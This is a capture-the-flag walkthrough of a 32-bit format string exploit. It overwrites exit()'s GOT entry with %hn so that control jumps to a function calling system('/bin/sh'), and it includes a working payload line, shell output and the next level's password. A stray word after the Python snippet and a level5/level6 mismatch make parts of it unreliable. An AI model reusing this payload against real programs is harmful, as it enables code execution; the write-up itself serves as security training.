# level6

Again a Format String Exploit, but this time no variable to modify.
Even worse: no return, after `printf()` the function calls `exit()`

```gdb
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

By searchin a bit more, we see that there is another function in this program, named `o()`

```gdb
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"
```

So this `o()` function calls `system("/bin/sh")`, looks perfect to me!
Now we need a way to return to this function... but we cannot return so we have to jump to it.
However there is no jumps, in neither `main()` nor `n()`.
But, if we think about it, the `call` instruction is a jump. So how do we use this to our advantage.

After `printf()`, the only thing done is to call `exit()`.
`exit()` is a libc function, located in the GOT.

The GOT (Global Offset Table) is a section of the program's memory that maps the real address (the one in the libc) of a function at execution time.
This is what a GOT function looks like (`exit()` in our case):

```gdb
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:     push   0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

The first line is "jump to the value stored at 0x8049838".
So our goal for the exploit is to overwrite the value stored at 0x8049838 to the address of our `o()` function.
But what even is in this address?

```gdb
(gdb) x/wx 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
```

There is the value `0x080483d6`, the address of `o()` is `0x80484a4`.
This is great because the first two bytes are the same: `0804`,
so we only need to change the last part of the address, which means only one `"%hn"`.

We need to write `84a4` which is 33956 in decimal.
Before anything, let see when we start popiing our own address.

```bash
level5@RainFall:~$ ./level5
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```

So the 4th address is the good one.

```python
print("\x38\x98\x04\x08" +
      "%c" * 2 +
      "%33950u" +
      "%hn"
      )whoa
```

We write the address, then we pop 2 values and the 3rd value we pop will add the padding.
The first line will write 4 characters, the 2nd one will write 2 characters and the 3rd one 33950.
4 + 2 + 33950 = 33956, that matches our `84a4` so we can now write the value with `%hn`.

```bash
level5@RainFall:~$ python level5.py | ./level5
8�
[...]
                                                    3086956496
whoami
level6
cd ../level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## .pass: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31